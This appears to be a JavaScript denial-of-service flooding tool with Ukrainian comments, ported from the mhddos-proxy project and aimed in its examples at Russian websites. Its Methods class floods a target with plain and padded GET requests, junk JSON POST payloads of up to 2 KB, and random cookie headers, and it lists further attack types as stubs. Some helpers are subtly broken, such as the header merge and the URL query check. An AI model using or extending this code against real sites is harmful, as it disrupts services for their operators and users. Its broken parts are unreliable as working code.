// @ts-nocheck

/**
 * Основні HTTP заголовки для **POST** запитів
 */
const BASE_HEADERS = {
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'en-US,en;q=0.9',
'Cache-Control':'max-age=0',
'Connection':'Keep-Alive',
'Sec-Fetch-Dest':'document',
'Sec-Fetch-Mode':'navigate',
'Sec-Fetch-Site':'none',
'Sec-Fetch-User':'?1',
'Sec-Gpc':'1',
'Pragma':'no-cache',
'Upgrade-Insecure-Requests': '1'
};


/**
 * Основний конфіг для **POST** і **GET** запитів `fetch`
 */
const BASIC_MODES = {
	mode: 'no-cors',
	referrerPolicy: 'no-referrer',
	cache: 'no-cache',
	expires: 0
};

/****POST** Запит*/
const POST = {method: "POST"};
/****GET** Запит*/
const GET = {method: "GET"};

/**
 * **MIME** Типи контенту
 * 
 * Застосовуються для пакетів
 */
const MIME = {
	json: "application/json",
	xml: "application/xml"
};


/**
 * Змішування заголовків
 * 
 * Змішуються задані заголовки з основними (`BASIC_MODES`)
 * 
 * ---
 * Змішувач бандера-смузі)
 * @param {object} headers
 * @returns {object} Готові заголовки
 */
const composeHeaders = headers => Object(...BASE_HEADERS, ...headers);

/**
 * Змішування заголовків для POST запитів
 * @param {number} cl **Довжина запиту**
 * @param {MIME} ct **Тип запиту**
 * @param {string} body **Тіло запиту** (флуд)
 * @returns {object} Готові заголовки
 */
function composePostHeaders(cl, ct, body) {
	return {
		...POST,
		headers: composeHeaders(
			{
				'Content-Length': cl,
				'X-Requested-With': 'XMLHttpRequest',
				'Content-Type': ct
			}
		),
		body: body
	}
};

/**
 * Генератор URL для GET запиту з "начинкою"
 * @param {string} url **URL-Адреса**
 * @returns **URL**
 */
const composeURL = url => !url.search(/\?/) ? url + `?q=${floodString(64)}` : url;


/**
 * Генератор пакету для **POST** запиту
 * @param {number} size **Вага ~~бомби~~ пакету**
 * @param {MIME} type **Тип запиту**
 * @returns Пакет
 */
const Packet = (size, type) => 
(r => type != MIME.json ? r : [MIME.json, `{"data": "${r}"}`])(floodString(size));


/**
 * Генератор запиту
 * @param {string} target **Ціль**
 * @param {object} config **Конфіг**
 * @returns Відповідь
 */
async function request(target, config) {
	return await fetch(
		target,
		{...BASIC_MODES, ...config}
	)
	.catch(add_count)
	.then(add_count);
};

/**
 * # Методи атак
 * 
 * - **GET**
 * - **RGET**
 * - **POST**
 * - **STRESS**
 * - **COOKIE**
 * 
 * Код було перекладено з **_Python_** на **_JS_**
 * Репозиторій: mhddos-proxy
 */

class Methods {
	/**
	 * Конструктор
	 * @param {String} target **Ціль**
	 */
	constructor(target) {
		this.target = [target]
	};

	/**
	 * Генератор простого [**GET**](https://google.com/?q=GET+Запити) запиту
	 * 
	 * Швидкі GET запити без пакетів
	 * @returns Відповідь
	 */
	async GET() {
		return await request(this.target[0], GET)
	};

	/**
	 * ## Генератор [**GET**](https://google.com/?q=GET+Запити) запиту з начинкою (пакетом)
	 * 
	 * ---
	 * Приклад:
	 * - `https://russia.ru?q=...`
	 */
	async RGET() {
		return await request(composeURL(this.target[0]), GET)
	};

	/**
	 * ## Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з бомбою
	 * 
	 * Приклад:
	 * - `https://russia.ru`
	 * ---
	 * Данні користувачу не видимі, але вони є
	 * 
	 * За завісою:
	 * - `Content-Type: application/json`
	 * - ```
	 * {"data": "..."}
	 * ```
	 * ---
	 * Ці пакети **середньої важкості**, і нормально навантажують сервери русні)
	 * @returns Відповідь
	 */
	async POST() {
		return await request(this.target[0], 
			composePostHeaders(76, ...Packet(128, MIME.json))
		)
	};

	/**
	 * ## Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з ядерною бомбою
	 * 
	 * Приклад:
	 * - `https://russia.ru`
	 * ---
	 * Данні користувачу не видимі, але вони є
	 * 
	 * За завісою:
	 * - `Content-Type: application/json`
	 * - ```
	 * {"data": "..."}
	 * ```
	 * ---
	 * Ці пакети **дуже важкі**, і добряче навантажують сервери русні)
	 * 
	 * @param {boolean} big_packets Чи використовувати великі пакети
	 * @returns Відповідь
	 */
	async STRESS(big_packets=true) {
		return await request(this.target[0], 
			big_packets?
			composePostHeaders(
				2060, ...Packet(2048, MIME.json)
			):
			composePostHeaders(
				524, ...Packet(512, MIME.json)
			)

		)
	};

	/**
	 * Генератор [**POST**](https://google.com/?q=POST+Запити) запиту з ["пряниками"](https://google.com/?q=Що+таке+%22Cookies%22+в+сайтах) для русні)
	 * 
	 * ---
	 * Цей метод відправляє рандомні [**Cookies**](https://google.com/?q=Що+таке+%22Cookies%22+в+сайтах)
	 * 
	 * Пряники ці - з **проносним**, спеціально для русні)
	 * @returns Відповідь
	 */
	async COOKIE() {
		return await request(this.target[0], {
			...POST,
			headers: composeHeaders(
				{'Cookie': `_ga=GA${getRandomArbitrary(1000, 99999)};
				 _gat=1;
				 __cfduid=dc232334gwdsd23434542342342342475611928;
				 ${Packet(6)}=${Packet(32)}`}
			)
		})
	}
	/*
	async APACHE() {}
	async XMLRPC() {}
	async PPS() {}
	async DYN() {}
	async CFB() {}
	async EVEN() {}
	async SLOW() {}
	async TCP() {}
	async RHEX() {}
	async STOMP() {}
	async UDP() {}
	async VSE() {}
	*/
}

